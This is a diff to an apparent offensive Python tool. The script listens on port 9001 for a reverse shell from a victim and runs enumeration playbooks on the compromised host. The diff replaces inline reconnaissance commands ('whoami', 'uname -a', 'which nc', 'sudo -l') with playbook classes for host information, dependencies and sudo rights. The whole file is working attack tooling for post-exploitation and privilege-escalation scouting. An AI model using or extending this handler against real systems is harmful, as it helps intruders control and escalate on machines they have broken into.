@@ -1,6 +1,8 @@
-import playbooks.enumerate_dependencies
-import pheelshell
 import pwn
+import pheelshell
+import playbooks.enumerate.sudo_list
+import playbooks.enumerate.basic_host_information
+import playbooks.enumerate.dependencies
 import utilities
 
 LISTENING_PORT = 9001
@@ -14,19 +16,10 @@ def main():
             attacker_ip = ipv4
             break
 
-    short_commands = [
-        'whoami',
-        'hostname',
-        'uname -a',
-        'which nc'
-    ]
-
-    long_commands = [
-        'sudo -l'
-    ]
-
     active_playbooks = [
-        playbooks.enumerate_dependencies.EnumerateDependencies()
+        playbooks.enumerate.dependencies.EnumerateDependencies(),
+        playbooks.enumerate.basic_host_information.EnumerateBasicHostInformation(),
+        playbooks.enumerate.sudo_list.EnumerateSudoList()
     ]
 
     commands_output = {}
@@ -34,20 +27,9 @@ def main():
     with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
         shell = pheelshell.PheelShell(client, b'$ ', attacker_ip)
 
-        for command in short_commands:
-            output = shell.send_command_read_output(command.encode(), single_line_output=True)
-            commands_output[command] = output
-
-        for command in long_commands:
-            output = shell.send_command_read_cached_temporary_file(command)
-            commands_output[command] = output
-        
         for playbook in active_playbooks:
             playbook = shell.run_playbook(playbook)
-    
-    for command, output in commands_output.items():
-        print(f'{command}\n--------\n{output}\n--------\n')
-    
+
     for playbook in active_playbooks:
         print(str(playbook))
 
